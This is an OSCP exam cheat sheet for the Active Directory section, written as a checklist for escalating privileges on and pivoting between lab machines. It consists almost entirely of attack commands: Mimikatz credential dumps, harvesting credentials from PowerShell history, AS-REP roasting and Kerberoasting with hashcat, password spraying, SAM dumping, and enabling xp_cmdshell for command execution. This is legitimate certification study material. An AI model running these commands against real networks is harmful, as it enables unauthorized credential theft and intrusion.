---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# OSCP

## ðŸªŸ AD Part

1. `MS01` â†’ enumerate, setup pivot, PE

## ðŸš€ MS01 PE

* [x] Check user's privileges:

```powershell
whoami /priv
```

â†’ `SeImpersonatePrivilege` â†’ [escalate to LA](https://x7331.gitbook.io/boxes/tl-dr/active-directory/privileges/seimpersonateprivilege)

* [x] Look for custom binaries:&#x20;

â†’ `strings` locally&#x20;

â†’ [Binary](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#service-binary-hijacking)/[DLL](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#dll-hijacking) hijacking

### 2. Pillaging



* Dump credentials with Mimikatz:

```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
```

* Check PowerShell history:

```
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Enumerate the path
(Get-PSReadlineOption).HistorySavePath
# List its contents
cat C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

* Enumerate domain users and build a wordlist

```
$ nxc smb 192.168.X.X -u <user> -p <pass> --users | awk '$1 == "SMB" && $5 != "[+]" && $5 != "-Username-" && $5 != "[*]" {print $5}' > domain_users
```

* Enumerate SMB shares

```
nxc smb 192.168.X.X -u <user> -p <pass> --shares
```

* Check for [AS-REP Roasting](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/asreproasting):

```
impacket-GetNPUsers oscp.exam/ -dc-ip 10.10.X.X -no-pass -usersfile domain_users
hashcat -m 18200 asreproast_users /usr/share/wordlists/rockyou -r /usr/share/hashcast/rules/best64.rule --force
```

* Check for [Kerberoasting](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/kerberoasting):

```
impacket-GetUserSPNs -request -dc-ip 10.10.X.X oscp.exam/<user>
hashcat -m 13100 kerberoast_users /usr/share/wordlist/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

* Password spray the domain to enumerate valid accounts and remote access:

```
nxc smb domain_ips -u domain_users -p passwords --continue-on-success | grep +
nxc winrm domain_ips -u domain_users -p passwords --continue-on-success | grep +
nxc rdp domain_ips -u domain_users -p passwords --continue-on-success | grep +
```

### 2. Pivot to MS02



* Use sprayed creds to check access via WinRM or RDP:

```
evil-winrm -u <user> -p <pass> -i <MS02>
xfreerdp /u:<user> /p:<pass> /v:<MS02> /smart-sizing
```

### 3. Enumerate MS02



* Check for `C:\windows.old` folder â†’ [dump SAM and SYSTEM locally](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/local-sam-dump):

```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

* Look for custom binaries â†’ download and run `strings` to extract creds, check for [binary](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#service-binary-hijacking)/[DLL](https://x7331.gitbook.io/boxes/tl-dr/active-directory/attacks/services#dll-hijacking) hijacking
* Check local sockets:

```
netstat -ano
```

* Check [PowerShell history](https://x7331.gitbook.io/boxes/tl-dr/infra/windows#files):

```
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Enumerate the path
(Get-PSReadlineOption).HistorySavePath
# List its contents
cat C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

* if `sql_svc` is owned, interact via Impacket or NetExec:

```
# Impacket
mssqlclient.py <domain>/<user>@<host> -windows-auth
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# NXC
# Remote queries
nxc mssql <target> -u <user> -p <pass> --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
# System RCE via xp_cmdshell
nxc mssql <target> -u <user> -p <pass> --local-auth -x whoami
```

* Pass-spray all discovered creds
